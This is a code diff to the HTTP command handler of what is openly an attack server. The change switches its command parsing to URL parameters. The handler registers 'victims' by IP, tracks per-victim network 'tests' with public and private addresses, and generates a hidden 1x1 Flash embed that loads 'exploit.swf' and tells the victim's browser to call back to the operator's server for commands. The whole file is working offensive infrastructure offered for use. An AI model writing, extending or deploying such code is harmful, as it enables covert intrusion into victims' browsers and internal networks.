@@ -10,6 +10,7 @@ import select
 import time
 import uuid
 import base64
+from urllib import unquote
 from datetime import datetime
 
 class HTTPProtoHandler(asyncore.dispatcher_with_send):
@@ -31,27 +32,45 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 				if headerparts[0].strip().upper()==header_name.upper():
 					result = header.strip()
 		return result
+	def parseURLArgs(self,command):
+		try:
+			cmd_parts = command.split("&")
+			params = {}
+			for part in cmd_parts:
+				item = part.split("=")
+				param_name = item[0].strip().lower()
+				if param_name !="ts":#ignore timestamp
+					params[param_name]=item[1].strip()
+					if params[param_name]!="":
+						params[param_name] = unquote(params[param_name]).decode('utf8')
+			return params
+		except Exception, e:
+				self.server.log("Error in web.parseURLArgs('"+command+"') : " + e.message,2)
+				return {}
 	def handle_cmd(self,command):
 		"""Validates command structure, sends data for processing to engine (self.server.CALLER) and returns output to client"""
-		cmd_parts = command.split("_")
-		cmd = cmd_parts[0].upper().strip()
+		cmd_parts = self.parseURLArgs(command)
 		result=""
+		if "cmd" in cmd_parts:
+			cmd = cmd_parts['cmd'].upper().strip()
+		else:
+			cmd="NONE"	
 		if cmd=="REG":
-			if len(cmd_parts)!=2:
+			if not "ip" in cmd_parts:	#ci=client ip
 				self.server.log("Received invalid REG command : " + command,2)
 			else:
-				client_ip = cmd_parts[1].strip()
-				if self.server.CALLER.isValidIPv4(client_ip)!=True:
+				client_ip = cmd_parts['ip']
+				if not self.server.CALLER.isValidIPv4(client_ip):
 					self.server.log("Received invalid IP for REG command : " + command,2)
 				else:
 					client_id = self.server.CALLER.registerVictim(self,client_ip)
 					return client_id
 		elif cmd=="POLL":
-			if len(cmd_parts)!=3:
+			if not "ci" in cmd_parts:
 				self.server.log("Received invalid POLL command : " + command,0)
 			else:
 				#part[2] is random identifier, tobe discarded
-				client_id = cmd_parts[1].strip()
+				client_id = cmd_parts['ci']
 				client = self.server.CALLER.getVictimByVictimId(client_id)
 				if client != None:
 					client.LAST_SEEN= datetime.now()
@@ -62,57 +81,60 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 				else:
 					self.server.log("Received POLL command for unknown client: " + command,4)
 		elif cmd=="ADD":
-			if len(cmd_parts)!=6:
+			try:
+				client_id = cmd_parts["ci"]
+				proto = cmd_parts["proto"].upper()
+				ip = cmd_parts["ip"]
+				port = cmd_parts["port"]
+			except KeyError:
 				self.server.log("Received invalid ADD command : " + command,2)
-			else:
-				client_id = cmd_parts[1].strip()
-				client = self.server.CALLER.getVictimByVictimId(client_id)
-				if client != None:
-					client.LAST_SEEN= datetime.now()
-					proto = cmd_parts[2].strip().upper()
-					ip = cmd_parts[3].strip()
-					port = cmd_parts[4].strip()
-					if proto in self.server.CALLER.PROTOS and self.server.CALLER.isValidIPv4(ip) and self.server.CALLER.isValidPort(port):						
-						#distrust whatever comes from the web
-						result = client.addTest(proto,ip,port)
-					else:
-						self.server.log("Received invalid ADD command : " + command,2)
+				client_id=""
+			client = self.server.CALLER.getVictimByVictimId(client_id)
+			if client != None:
+				client.LAST_SEEN= datetime.now()
+				if proto in self.server.CALLER.PROTOS and self.server.CALLER.isValidIPv4(ip) and self.server.CALLER.isValidPort(port):						
+					#distrust whatever comes from the web
+					result = client.addTest(proto,ip,port)
 				else:
-					self.server.log("Received ADD command for unknown client:  " + command,4)
+					self.server.log("Received invalid ADD command : " + command,2)
+			else:
+				self.server.log("Received ADD command for unknown client:  " + command,4)
 		elif  cmd=="STATUS":
-			if len(cmd_parts)!= 3:
+			if not "testid" in cmd_parts:
 				self.server.log("Received invalid STATUS command : " + command,2)
 			else:
-				test = self.server.CALLER.getVictimTest(cmd_parts[1].strip())
+				test = self.server.CALLER.getVictimTest(cmd_parts["testid"])
 				if test != None:
 					result = test.STATUS + " " + str(test.RESULT)
 				else:
 					result = "0"
 		elif cmd=="GENFLASH" or cmd=="GENFLASHIE":
-			if len(cmd_parts)!= 3:
-				self.server.log("Received invalid GENFLASH command : " + command,2)
-			else:
+			try:
+				client_id=cmd_parts["ci"]
+				server=cmd_parts["server"]
 				result="""
 <object id="flash" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="1" height="1">
 	<param name="movie" value="exploit.swf">
 	<param name="quality" value="high">
 	<param name="AllowScriptAccess" value="always">
 	<param name="bgcolor" value="FFFFFF">
-	<param name="FlashVars" value="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2].split(":")[0]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli">
+	<param name="FlashVars" value="ci="""+str(client_id)+"""&amp;server="""+server.split(":")[0]+"""&amp;cmdURL=http://"""+server+"""/cli">
 	<param name="wmode" value="window">
-	<embed name="flash" src="exploit.swf" width="1" height="1" wmode="window" allowscriptaccess="always" bgcolor="FFFFFF" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" flashvars="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2].split(":")[0]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli">
+	<embed name="flash" src="exploit.swf" width="1" height="1" wmode="window" allowscriptaccess="always" bgcolor="FFFFFF" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" flashvars="ci="""+client_id+"""&amp;server="""+server.split(":")[0]+"""&amp;cmdURL=http://"""+server+"""/cli">
 	</embed>
 </object>
 """
+			except KeyError:
+				self.server.log("Received invalid GENFLASH command : " + command,2)
 		elif cmd=="LIST":
-			if len(cmd_parts)!= 2:
-				self.server.log("Received invalid LIST command : " + command,2)
-			else:
-				client_id = cmd_parts[1].strip()
+			try:
+				client_id = cmd_parts["ci"]
 				client = self.server.CALLER.getVictimByVictimId(client_id)
 				if client != None:
 					for test in client.TESTS:
 						result = result + test.TEST_ID + "|"  + test.STATUS + "|" + test.TEST_TYPE + "|" + str(test.RESULT) + "|" + test.PUBLIC_IP + "|" + test.PRIVATE_IP + "|" + test.PUBLIC_PORT + "|" + test.PRIVATE_PORT + "\n"
+			except KeyError:
+				self.server.log("Received invalid LIST command : " + command,2)
 		if result=="": result="0"
 		return result
 	
